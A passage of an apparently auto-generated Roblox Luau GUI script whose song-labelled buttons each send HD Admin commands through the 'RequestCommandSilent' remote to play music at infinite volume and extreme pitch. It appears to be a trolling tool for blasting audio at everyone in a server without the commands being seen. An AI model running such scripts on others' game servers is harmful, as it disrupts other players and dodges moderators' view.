local script = LocalScript66
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 75193843519993 ;volume inf ;pitch 0.9")
end)
end

local TextButton66 = Instance.new("TextButton")
TextButton66.Name = "TextButton"
TextButton66.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton66.Text = "anonymous"
TextButton66.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton66.TextSize = 17
TextButton66.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton66.TextWrapped = true
TextButton66.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton66.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton66.BorderSizePixel = 2
TextButton66.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton66.Size = UDim2.new(0, 113, 0, 53)
TextButton66.ZIndex = 2
TextButton66.Parent = ScrollingFrame

local LocalScript67 = Instance.new("Folder")
LocalScript67.Name = "LocalScript"
LocalScript67.Parent = TextButton66
__S[#__S + 1] = function(...)
local script = LocalScript67
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 1837371778 ;volume inf")
end)
end

local TextButton67 = Instance.new("TextButton")
TextButton67.Name = "TextButton"
TextButton67.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton67.Text = "wind of the fjords"
TextButton67.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton67.TextSize = 17
TextButton67.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton67.TextWrapped = true
TextButton67.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton67.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton67.BorderSizePixel = 2
TextButton67.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton67.Size = UDim2.new(0, 113, 0, 53)
TextButton67.ZIndex = 2
TextButton67.Parent = ScrollingFrame

local LocalScript68 = Instance.new("Folder")
LocalScript68.Name = "LocalScript"
LocalScript68.Parent = TextButton67
__S[#__S + 1] = function(...)
local script = LocalScript68
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 134907499311321 ;volume inf")
end)
end

local TextButton68 = Instance.new("TextButton")
TextButton68.Name = "TextButton"
TextButton68.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton68.Text = "dj twisty jumpstyle"
TextButton68.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton68.TextSize = 17
TextButton68.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton68.TextWrapped = true
TextButton68.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton68.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton68.BorderSizePixel = 2
TextButton68.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton68.Size = UDim2.new(0, 113, 0, 53)
TextButton68.ZIndex = 2
TextButton68.Parent = ScrollingFrame

local LocalScript69 = Instance.new("Folder")
LocalScript69.Name = "LocalScript"
LocalScript69.Parent = TextButton68
__S[#__S + 1] = function(...)
local script = LocalScript69
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 83163403313802 ;volume inf ;pitch 3.5")
end)
end

local TextButton69 = Instance.new("TextButton")
TextButton69.Name = "TextButton"
TextButton69.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton69.Text = "jumpstyle reverbed"
TextButton69.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton69.TextSize = 17
TextButton69.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton69.TextWrapped = true
TextButton69.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton69.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton69.BorderSizePixel = 2
TextButton69.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton69.Size = UDim2.new(0, 113, 0, 53)
TextButton69.ZIndex = 2
TextButton69.Parent = ScrollingFrame

local LocalScript70 = Instance.new("Folder")
LocalScript70.Name = "LocalScript"
LocalScript70.Parent = TextButton69
__S[#__S + 1] = function(...)
local script = LocalScript70
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 98464664165970 ;volume inf ;pitch 0.068")
end)
end

local TextButton70 = Instance.new("TextButton")
TextButton70.Name = "TextButton"
TextButton70.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton70.Text = "i got black i got white"
TextButton70.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton70.TextSize = 17
TextButton70.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton70.TextWrapped = true
TextButton70.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton70.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton70.BorderSizePixel = 2
TextButton70.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton70.Size = UDim2.new(0, 113, 0, 53)
TextButton70.ZIndex = 2
TextButton70.Parent = ScrollingFrame

local LocalScript71 = Instance.new("Folder")
LocalScript71.Name = "LocalScript"
LocalScript71.Parent = TextButton70
__S[#__S + 1] = function(...)
local script = LocalScript71
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 133352226656850 ;volume inf ;pitch 0.057")
end)
end

local TextButton71 = Instance.new("TextButton")
TextButton71.Name = "TextButton"
TextButton71.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton71.Text = "body rolls remix"
TextButton71.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton71.TextSize = 17
TextButton71.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton71.TextWrapped = true
TextButton71.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton71.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton71.BorderSizePixel = 2
TextButton71.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton71.Size = UDim2.new(0, 113, 0, 53)
TextButton71.ZIndex = 2
TextButton71.Parent = ScrollingFrame

local LocalScript72 = Instance.new("Folder")
LocalScript72.Name = "LocalScript"
LocalScript72.Parent = TextButton71
__S[#__S + 1] = function(...)
local script = LocalScript72
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 79291377800678 ;volume inf ;pitch 0.043")
end)
end

local TextButton72 = Instance.new("TextButton")
TextButton72.Name = "TextButton"
TextButton72.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton72.Text = "you're on doxbin"
TextButton72.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton72.TextSize = 17
TextButton72.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton72.TextWrapped = true
TextButton72.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton72.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton72.BorderSizePixel = 2
TextButton72.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton72.Size = UDim2.new(0, 113, 0, 53)
TextButton72.ZIndex = 2
R[487] = TextButton72
TextButton72.Parent = ScrollingFrame


end
do -- chunk 5/6
local LocalScript = Instance.new("Folder")
LocalScript.Name = "LocalScript"
LocalScript.Parent = R[487]
__S[#__S + 1] = function(...)
local script = LocalScript
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 72606104772802 ;volume inf ;pitch 0.047")
end)
end

local TextButton = Instance.new("TextButton")
TextButton.Name = "TextButton"
TextButton.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton.Text = "spooky scary skeletons dubstep"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 17
TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextWrapped = true
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton.BorderSizePixel = 2
TextButton.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton.Size = UDim2.new(0, 113, 0, 53)
TextButton.ZIndex = 2
TextButton.Parent = R[379]

local LocalScript2 = Instance.new("Folder")
LocalScript2.Name = "LocalScript"
LocalScript2.Parent = TextButton
__S[#__S + 1] = function(...)
local script = LocalScript2
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 122540913295853 ;volume inf ;pitch 0.92")
end)
end

local TextButton2 = Instance.new("TextButton")
TextButton2.Name = "TextButton"
TextButton2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton2.Text = "great strategy"
TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.TextSize = 17
TextButton2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.TextWrapped = true
TextButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton2.BorderSizePixel = 2
TextButton2.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton2.Size = UDim2.new(0, 113, 0, 53)
TextButton2.ZIndex = 2
TextButton2.Parent = R[379]

local LocalScript3 = Instance.new("Folder")
LocalScript3.Name = "LocalScript"
LocalScript3.Parent = TextButton2
__S[#__S + 1] = function(...)
local script = LocalScript3
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 128100561912476 ;volume inf ;pitch 1.05")
end)
end

local TextButton3 = Instance.new("TextButton")
TextButton3.Name = "TextButton"
TextButton3.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton3.Text = "great strategy 2"
TextButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.TextSize = 17
TextButton3.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.TextWrapped = true
TextButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton3.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton3.BorderSizePixel = 2
TextButton3.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton3.Size = UDim2.new(0, 113, 0, 53)
TextButton3.ZIndex = 2
TextButton3.Parent = R[379]

local LocalScript4 = Instance.new("Folder")
LocalScript4.Name = "LocalScript"
LocalScript4.Parent = TextButton3
__S[#__S + 1] = function(...)
local script = LocalScript4
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 111697636672435 ;volume inf ;pitch 0.9")
end)
end

local TextButton4 = Instance.new("TextButton")
TextButton4.Name = "TextButton"
TextButton4.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton4.Text = "great strategy 3"
TextButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton4.TextSize = 17
TextButton4.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton4.TextWrapped = true
TextButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton4.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton4.BorderSizePixel = 2
TextButton4.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton4.Size = UDim2.new(0, 113, 0, 53)
TextButton4.ZIndex = 2
TextButton4.Parent = R[379]

local LocalScript5 = Instance.new("Folder")
LocalScript5.Name = "LocalScript"
LocalScript5.Parent = TextButton4
__S[#__S + 1] = function(...)
local script = LocalScript5
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 78834066924790 ;volume inf")
end)
end

local TextButton5 = Instance.new("TextButton")
TextButton5.Name = "TextButton"
TextButton5.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton5.Text = "anonymous 2"
TextButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.TextSize = 17
TextButton5.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.TextWrapped = true
TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton5.BorderSizePixel = 2
TextButton5.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton5.Size = UDim2.new(0, 113, 0, 53)
TextButton5.ZIndex = 2
TextButton5.Parent = R[379]

local LocalScript6 = Instance.new("Folder")
LocalScript6.Name = "LocalScript"
LocalScript6.Parent = TextButton5
__S[#__S + 1] = function(...)
local script = LocalScript6
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 72551901426352 ;volume inf")
end)
end

local TextButton6 = Instance.new("TextButton")
TextButton6.Name = "TextButton"
TextButton6.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton6.Text = "sesame street"
TextButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton6.TextSize = 17
TextButton6.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton6.TextWrapped = true
TextButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton6.BorderSizePixel = 2
TextButton6.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton6.Size = UDim2.new(0, 113, 0, 53)
TextButton6.ZIndex = 2
TextButton6.Parent = R[379]

local LocalScript7 = Instance.new("Folder")
LocalScript7.Name = "LocalScript"
LocalScript7.Parent = TextButton6
__S[#__S + 1] = function(...)
local script = LocalScript7
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 134426707262246 ;volume inf ;pitch 0.93")
end)
end

local TextButton7 = Instance.new("TextButton")
TextButton7.Name = "TextButton"
TextButton7.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton7.Text = "kiss me again remix"
TextButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton7.TextSize = 17
TextButton7.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton7.TextWrapped = true
TextButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton7.BorderSizePixel = 2
TextButton7.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton7.Size = UDim2.new(0, 113, 0, 53)
TextButton7.ZIndex = 2
TextButton7.Parent = R[379]

local LocalScript8 = Instance.new("Folder")
LocalScript8.Name = "LocalScript"
LocalScript8.Parent = TextButton7
__S[#__S + 1] = function(...)
local script = LocalScript8
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 136303346026290 ;volume inf")
end)
end

local TextButton8 = Instance.new("TextButton")
TextButton8.Name = "TextButton"
TextButton8.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton8.Text = "MLG"
TextButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton8.TextSize = 17
TextButton8.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton8.TextWrapped = true
TextButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton8.BorderSizePixel = 2
TextButton8.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton8.Size = UDim2.new(0, 113, 0, 53)
TextButton8.ZIndex = 2
TextButton8.Parent = R[379]

local LocalScript9 = Instance.new("Folder")
LocalScript9.Name = "LocalScript"
LocalScript9.Parent = TextButton8
__S[#__S + 1] = function(...)
local script = LocalScript9
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 7024332460 ;volume inf")
end)
end

local TextButton9 = Instance.new("TextButton")
TextButton9.Name = "TextButton"
TextButton9.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton9.Text = "fuck him fuck her"
TextButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.TextSize = 17
TextButton9.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.TextWrapped = true
TextButton9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton9.BorderSizePixel = 2
TextButton9.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton9.Size = UDim2.new(0, 113, 0, 53)
TextButton9.ZIndex = 2
TextButton9.Parent = R[379]

local LocalScript10 = Instance.new("Folder")
LocalScript10.Name = "LocalScript"
LocalScript10.Parent = TextButton9
__S[#__S + 1] = function(...)
local script = LocalScript10
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 132512957453594 ;volume inf")
end)
end

local TextButton10 = Instance.new("TextButton")
TextButton10.Name = "TextButton"
TextButton10.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton10.Text = "shotgun willy"
TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextSize = 17
TextButton10.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextWrapped = true
TextButton10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton10.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton10.BorderSizePixel = 2
TextButton10.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton10.Size = UDim2.new(0, 113, 0, 53)
TextButton10.ZIndex = 2
TextButton10.Parent = R[379]

local LocalScript11 = Instance.new("Folder")
LocalScript11.Name = "LocalScript"
LocalScript11.Parent = TextButton10
__S[#__S + 1] = function(...)
local script = LocalScript11
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 111773810931020 ;volume inf ;pitch 0.053")
end)
end

local TextButton11 = Instance.new("TextButton")
TextButton11.Name = "TextButton"
TextButton11.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton11.Text = "sweater weather"
TextButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextSize = 17
TextButton11.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextWrapped = true
TextButton11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton11.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton11.BorderSizePixel = 2
TextButton11.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton11.Size = UDim2.new(0, 113, 0, 53)
TextButton11.ZIndex = 2
TextButton11.Parent = R[379]

local LocalScript12 = Instance.new("Folder")
LocalScript12.Name = "LocalScript"
LocalScript12.Parent = TextButton11
__S[#__S + 1] = function(...)
local script = LocalScript12
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 74681374705431 ;volume inf ;pitch 0.055")
end)
end

local TextButton12 = Instance.new("TextButton")
TextButton12.Name = "TextButton"
TextButton12.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton12.Text = "in the h3art"
TextButton12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton12.TextSize = 17
TextButton12.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton12.TextWrapped = true
TextButton12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton12.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton12.BorderSizePixel = 2
TextButton12.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton12.Size = UDim2.new(0, 113, 0, 53)
TextButton12.ZIndex = 2
TextButton12.Parent = R[379]

local LocalScript13 = Instance.new("Folder")
LocalScript13.Name = "LocalScript"
LocalScript13.Parent = TextButton12
__S[#__S + 1] = function(...)
local script = LocalScript13
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 121387932041149 ;volume inf ;pitch 0.087")
end)
end

local TextButton13 = Instance.new("TextButton")
TextButton13.Name = "TextButton"
TextButton13.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton13.Text = "RAINING MEN"
TextButton13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton13.TextSize = 17
TextButton13.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton13.TextWrapped = true
TextButton13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton13.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton13.BorderSizePixel = 2
TextButton13.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton13.Size = UDim2.new(0, 113, 0, 53)
TextButton13.ZIndex = 2
TextButton13.Parent = R[379]

local LocalScript14 = Instance.new("Folder")
LocalScript14.Name = "LocalScript"
LocalScript14.Parent = TextButton13
__S[#__S + 1] = function(...)
local script = LocalScript14
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 99246281578966 ;volume inf ;pitch 0.075")
end)
end

local TextButton14 = Instance.new("TextButton")
TextButton14.Name = "TextButton"
TextButton14.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton14.Text = "cause of death"
TextButton14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton14.TextSize = 17
TextButton14.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton14.TextWrapped = true
TextButton14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton14.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton14.BorderSizePixel = 2
TextButton14.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton14.Size = UDim2.new(0, 113, 0, 53)
TextButton14.ZIndex = 2
TextButton14.Parent = R[379]

local LocalScript15 = Instance.new("Folder")
LocalScript15.Name = "LocalScript"
LocalScript15.Parent = TextButton14
__S[#__S + 1] = function(...)
local script = LocalScript15
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 86405483489832 ;volume inf ;pitch 0.038")
end)
end

local TextButton15 = Instance.new("TextButton")
TextButton15.Name = "TextButton"
TextButton15.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton15.Text = "digging this feeling"
TextButton15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton15.TextSize = 17
TextButton15.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton15.TextWrapped = true
TextButton15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton15.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton15.BorderSizePixel = 2
TextButton15.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton15.Size = UDim2.new(0, 113, 0, 53)
TextButton15.ZIndex = 2
TextButton15.Parent = R[379]

local LocalScript16 = Instance.new("Folder")
LocalScript16.Name = "LocalScript"
LocalScript16.Parent = TextButton15
__S[#__S + 1] = function(...)
local script = LocalScript16
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 116522643745698 ;volume inf ;pitch 0.09")
end)
end

local TextButton16 = Instance.new("TextButton")
TextButton16.Name = "TextButton"
TextButton16.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton16.Text = "trillium hardtekk"
TextButton16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton16.TextSize = 17
TextButton16.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton16.TextWrapped = true
TextButton16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton16.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton16.BorderSizePixel = 2
TextButton16.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton16.Size = UDim2.new(0, 113, 0, 53)
TextButton16.ZIndex = 2
TextButton16.Parent = R[379]

local LocalScript17 = Instance.new("Folder")
LocalScript17.Name = "LocalScript"
LocalScript17.Parent = TextButton16
__S[#__S + 1] = function(...)
local script = LocalScript17
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 120151137477230 ;volume inf ;pitch 0.047")
end)
end

local TextButton17 = Instance.new("TextButton")
TextButton17.Name = "TextButton"
TextButton17.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton17.Text = "NCS my heart"
TextButton17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton17.TextSize = 17
TextButton17.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton17.TextWrapped = true
TextButton17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton17.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton17.BorderSizePixel = 2
TextButton17.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton17.Size = UDim2.new(0, 113, 0, 53)
TextButton17.ZIndex = 2
TextButton17.Parent = R[379]

local LocalScript18 = Instance.new("Folder")
LocalScript18.Name = "LocalScript"
LocalScript18.Parent = TextButton17
__S[#__S + 1] = function(...)
local script = LocalScript18
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
